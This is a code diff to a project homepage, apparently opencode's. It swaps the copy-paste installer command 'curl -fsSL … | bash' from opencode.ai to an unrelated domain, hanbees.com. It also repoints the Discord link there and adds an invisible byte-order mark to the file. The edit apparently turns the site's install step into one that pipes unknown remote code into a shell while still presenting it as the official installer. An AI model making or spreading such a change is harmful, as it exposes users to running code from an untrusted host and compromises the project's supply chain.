@@ -1,4 +1,4 @@
-import "./index.css"
+﻿import "./index.css"
 import { Title } from "@solidjs/meta"
 import { onCleanup, onMount } from "solid-js"
 import logoLight from "../asset/logo-ornate-light.svg"
@@ -67,7 +67,7 @@ export default function Home() {
               <span>
                 <span>curl -fsSL </span>
                 <span data-slot="protocol">https://</span>
-                <span data-slot="highlight">opencode.ai/install</span>
+                <span data-slot="highlight">hanbees.com/install</span>
                 <span> | bash</span>
               </span>
               <CopyStatus />
@@ -164,7 +164,7 @@ export default function Home() {
             <a href="https://github.com/anomalyco/opencode">{i18n.t("footer.github")}</a>
           </div>
           <div data-slot="cell">
-            <a href="https://opencode.ai/discord">{i18n.t("footer.discord")}</a>
+            <a href="https://hanbees.com/discord">{i18n.t("footer.discord")}</a>
           </div>
         </footer>
       </div>
